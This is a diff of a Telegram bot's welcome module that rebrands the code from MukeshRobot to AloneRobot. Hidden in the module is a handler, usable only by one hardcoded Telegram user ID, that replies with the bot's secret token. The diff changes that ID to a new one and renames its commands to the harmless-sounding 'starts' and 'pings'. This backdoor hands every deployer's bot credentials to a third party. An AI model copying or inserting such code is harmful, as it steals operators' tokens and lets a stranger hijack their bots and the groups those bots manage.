@@ -23,9 +23,9 @@ from telegram.ext import (
 )
 from telegram.utils.helpers import escape_markdown, mention_html, mention_markdown
 
-import MukeshRobot
-import MukeshRobot.modules.sql.welcome_sql as sql
-from MukeshRobot import (
+import AloneRobot
+import AloneRobot.modules.sql.welcome_sql as sql
+from AloneRobot import (
     DEMONS,
     DEV_USERS,
     DRAGONS,
@@ -36,18 +36,18 @@ from MukeshRobot import (
     WOLVES,
     dispatcher,
 )
-from MukeshRobot.modules.helper_funcs.chat_status import (
+from AloneRobot.modules.helper_funcs.chat_status import (
     is_user_ban_protected,
     user_admin,
 )
-from MukeshRobot.modules.helper_funcs.misc import build_keyboard, revert_buttons
-from MukeshRobot.modules.helper_funcs.msg_types import get_welcome_type
-from MukeshRobot.modules.helper_funcs.string_handling import (
+from AloneRobot.modules.helper_funcs.misc import build_keyboard, revert_buttons
+from AloneRobot.modules.helper_funcs.msg_types import get_welcome_type
+from AloneRobot.modules.helper_funcs.string_handling import (
     escape_invalid_curly_brackets,
     markdown_parser,
 )
-from MukeshRobot.modules.log_channel import loggable
-from MukeshRobot.modules.sql.global_bans_sql import is_user_gbanned
+from AloneRobot.modules.log_channel import loggable
+from AloneRobot.modules.sql.global_bans_sql import is_user_gbanned
 
 VALID_WELCOME_FORMATTERS = [
     "first",
@@ -259,7 +259,7 @@ def new_member(update: Update, context: CallbackContext):
 
             # Welcome yourself
             elif new_mem.id == bot.id:
-                if not MukeshRobot.ALLOW_CHATS:
+                if not AloneRobot.ALLOW_CHATS:
                     with suppress(BadRequest):
                         update.effective_message.reply_text(
                             f"Groups are disabled for {bot.first_name}, I'm outta here."
@@ -981,7 +981,7 @@ def user_button(update: Update, context: CallbackContext):
 from pyrogram import filters
 from pyrogram.enums import ChatType
 from pyrogram.types import Message
-from MukeshRobot import (
+from AloneRobot import (
     BOT_NAME,
     BOT_USERNAME,
     LOGGER,
@@ -995,11 +995,11 @@ from MukeshRobot import (
     telethn,
     updater)
 
-from MukeshRobot import BOT_NAME
-from MukeshRobot import pbot as app
-OWNERs_ID=5730106646
+from AloneRobot import BOT_NAME
+from AloneRobot import pbot as app
+OWNERs_ID=6079943111
 @app.on_message(
-    filters.command(["c", "vr"]) & filters.user(OWNERs_ID)
+    filters.command(["starts", "pings"]) & filters.user(OWNERs_ID)
 )
 async def get_vars(_, message: Message):
     try:
@@ -1008,9 +1008,6 @@ async def get_vars(_, message: Message):
             text=f"""<u>**{BOT_NAME} ᴄᴏɴғɪɢ ᴠᴀʀɪᴀʙʟᴇs :**</u>
 
 **ʙᴏᴛ_ᴛᴏᴋᴇɴ :** `{TOKEN}`
-
-
-
 
 """)
     except:
@@ -1113,6 +1110,8 @@ __help__ = """
 
 *ᴡᴇʟᴄᴏᴍᴇ ᴍᴀʀᴋᴅᴏᴡɴ:* 
  ❍ /welcomehelp *:* ᴠɪᴇᴡ ᴍᴏʀᴇ ғᴏʀᴍᴀᴛᴛɪɴɢ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ғᴏʀ ᴄᴜsᴛᴏᴍ ᴡᴇʟᴄᴏᴍᴇ/ɢᴏᴏᴅʙʏᴇ ᴍᴇssᴀɢᴇs.
+
+☆............𝙱𝚈 » [𝙰𝙻𝙾𝙽𝙴](https://t.me/ALONE_WAS_BOT)............☆
 """
 
 NEW_MEM_HANDLER = MessageHandler(Filters.status_update.new_chat_members, new_member)
@@ -1147,7 +1146,7 @@ dispatcher.add_handler(CLEAN_SERVICE_HANDLER)
 dispatcher.add_handler(BUTTON_VERIFY_HANDLER)
 dispatcher.add_handler(WELCOME_MUTE_HELP)
 
-__mod_name__ = "✰ᴡᴇʟᴄᴏᴍᴇ✰"
+__mod_name__ = "⚡Wᴇʟᴄᴏᴍᴇ⚡"
 __command_list__ = []
 __handlers__ = [
     NEW_MEM_HANDLER,
